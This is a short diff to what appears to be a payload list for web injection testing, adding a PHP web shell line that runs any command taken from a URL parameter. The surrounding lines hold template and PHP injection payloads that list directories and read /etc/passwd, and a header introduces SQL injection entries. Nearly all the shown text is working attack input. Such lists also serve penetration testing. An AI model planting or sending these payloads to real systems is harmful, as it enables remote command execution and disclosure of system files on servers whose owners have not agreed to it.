@@ -4,6 +4,7 @@ ${@print('test')}
 ${@system('ls -la')}
 <?php system('tail /etc/passwd'); ?>
 <?php system('cat /etc/passwd'); ?>
+<?php echo "<pre>"; system($_GET[cmd]); ?>
 
 ~SQL injection~
 
